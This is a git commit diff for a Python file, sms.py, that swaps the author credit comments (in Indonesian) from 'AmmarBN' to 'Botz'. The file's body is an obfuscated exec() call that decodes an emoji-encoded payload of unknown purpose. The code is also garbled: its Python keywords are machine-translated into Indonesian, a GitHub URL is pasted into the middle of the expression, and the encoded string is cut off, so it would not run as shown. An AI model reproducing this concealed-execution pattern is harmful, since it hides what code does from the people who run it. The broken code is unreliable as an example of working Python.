c221ea0922c6527d1f97a9676d4995f5f0838880
©Botz GexusR <99302576+BotzwhatsApp@users.noreply.github.com>
2022-05-05 06:45:18 +0700

    Update sms.py

--- sms.py
+++ sms.py
@@ -1,5 +1,5 @@
-#hal oleh AmmarBN
-#Jangan lupa subscribe Youtube Ammar Executed
+#hal oleh Botz
+#Jangan lupa subscribe Youtube Team Executed
 # Github- 
 exec ( "" . join ( map ( chr ,[ int ( "" . join ( str ({ '😀' : 0 , '😁' : 3 , '😂' : 6 , '😃' : 1 , '😄' : 2 , '😅' : 4 , '😉' : 7 , '😊' : 8 , '😛' :9 ,'🤣' : 5 }[ i ]) untuk     i     di     x . bagi ())) untuk     x  https://github.com/BotzwhatsApp/sahur/blob/main/sms.py   in
 😄😁🤣😂😛😃😉
